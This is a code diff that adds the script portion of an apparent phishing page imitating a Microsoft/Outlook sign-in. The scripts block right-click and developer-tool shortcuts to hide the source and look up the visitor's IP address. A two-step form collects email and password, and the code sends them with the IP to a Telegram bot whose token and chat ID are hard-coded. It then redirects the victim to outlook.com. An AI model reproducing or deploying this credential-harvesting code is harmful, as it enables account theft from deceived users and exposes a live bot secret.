@@ -1,0 +1,94 @@
+
+<script src="scripts.js"></script>
+	
+<script>
+// Disable right-click context menu
+document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+});
+
+// Disable common keyboard shortcuts
+document.addEventListener('keydown', function(event) {
+    if (event.ctrlKey || event.metaKey) {
+        switch (event.key) {
+            case 'u': // Ctrl+U
+            case 's': // Ctrl+S
+            case 'p': // Ctrl+P
+                event.preventDefault();
+                break;
+            case 'i': // Ctrl+Shift+I
+            case 'j': // Ctrl+Shift+J
+                if (event.shiftKey) {
+                    event.preventDefault();
+                }
+                break;
+            case 'c': // Ctrl+Shift+C
+                if (event.shiftKey) {
+                    event.preventDefault();
+                }
+                break;
+            case 'k': // Ctrl+Shift+K (Firefox)
+                if (event.shiftKey) {
+                    event.preventDefault();
+                }
+                break;
+        }
+    }
+});
+</script>
+
+ <!-- START: Here's the IP stuff -->
+<script type="application/javascript">
+function getIP(json) {
+    document.getElementById("ipaddress").value = json.ip;
+}
+</script>
+
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+ <!-- END: IP Stuff -->	
+ 
+ 
+<script>
+      const forma = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "7284904058:AAGcFzkHJPhqY-l-89aLWRibxrs4HyUkioI",
+          chatID: "5423617982"
+      }
+
+      const emAil = document.querySelector('#usr')
+      const suBBer = document.querySelector('#suber')
+      const pWd = document.querySelector('#pwd')
+      const strong = document.querySelector('.strong')
+      
+	  const submit = document.querySelector('#sub').addEventListener('click', e =>{
+        if(emAil.value === ''){
+		
+		
+		
+          return
+        }
+        display.textContent = emAil.value
+        strong.textContent = 'Enter password'
+        emAil.style.display = 'none'
+        pWd.style.display = 'block'
+        submit.style.display = 'none'
+        suBBer.style.display = 'block'
+      })
+
+
+    forma.addEventListener("submit", e =>{
+          e.preventDefault();
+          let email = document.querySelector('#usr').value
+          let pwd = document.querySelector('#pwd').value
+		  let ips = document.querySelector('#ipaddress').value
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Microsoft=>${email}=${pwd}==IP:>${ips}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://outlook.com/");
+          }, error => {
+              console.log(error)
+              }) 
+      })
+    </script>
